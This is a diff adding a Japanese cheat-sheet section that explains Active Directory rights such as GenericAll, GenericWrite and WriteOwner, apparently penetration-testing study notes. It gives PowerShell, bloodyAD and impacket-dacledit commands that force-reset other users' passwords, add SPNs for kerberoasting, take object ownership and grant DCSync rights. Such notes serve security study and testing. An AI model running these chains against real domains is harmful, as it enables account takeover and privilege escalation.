@@ -65,3 +65,47 @@ Add-ObjectACL -PrincipalIdentity 'evil' -Credential $cred -Rights DCSync
 ```
 ## Cert Publishers
 このグループのメンバーは、Active Directoryのユーザーオブジェクトの証明書を発行する権限を持つ。このグループの名前変更、削除はできない。
+
+# Privilege
+## WriteDACL
+ACLの変更権限
+## ReadGMSAPassword
+GMSAアカウントのパスワードの読み取り権限
+## AllowedToDelegate
+DCにアクセスするユーザーのためのサービスチケットの要求権限
+## GenericAll
+パスワードを含むすべての属性の変更権限
+## ForceChangePassword
+以前のパスワードを知らずにパスワードを変更できる権限
+### GenericAll, ForceChangePasswordを使用したパスワード変更
+```powershell
+$SecurePass = ConvertTo-SecureString "Password123!" -AsPlain -Force
+Set-ADAccountPassword -Identity "<User>" -NewPassword $SecurePass -Reset
+```
+## GenericWrite
+SPNを含む属性変更権限
+### GenericWriteを使用したSPN付与
+```powershell
+$pass = convertto-securestring "<GenericWrite User Password>" -Asplain -Force
+$cred = new-object system.management.automation.pscredential ("<Domain>\<GenericWrite User Password>", $pass)
+Set-ADUser -Identity <SPNを付与するユーザー> -ServicePrincipalNames @{Add="<HTTP>/<anything>"} -Credential $cred # webサーバーに紐づくサービスアカウントにするためのSPNの付与
+```
+## GetChanges
+属性読み取り権限
+## GetChangesAll
+すべての属性読み取り権限
+## GetChangesInFilteredSet
+フィルタリングされている属性読み取り権限
+## WriteOwner
+対象オブジェクトの所有者変更権限、所有者になるとそのオブジェクトのDACLを編集できる権限が付与される。
+### WriteOwnerを使用した所有者変更からパスワード変更まで
+```bash
+# 所有者変更
+bloodyAD -d <Domain> --dc-ip <IP> --dns <DNS IP> -u '<WriteOwner User>' -p '<Password>' set owner '<User>' '<WriteOwner User>'
+# GenricAll権限付与
+bloodyAD -d <Domain> --dc-ip <IP> -u '<WriteOwner User>' -p '<Password>' add genericAll '<User>' '<WriteOwner User>'
+# DACL書き込み権限付与
+impacket-dacledit -action 'write' -principal '<WriteOwner User>' -target '<User>' '<Domain>/<WriteOwner User>:<Password>'
+# パスワード変更
+bloodyAD -d <Domain> --dc-ip <IP> -u '<WriteOwner User>' -p '<Password>' set password '<User>' 'Password123!'
+```
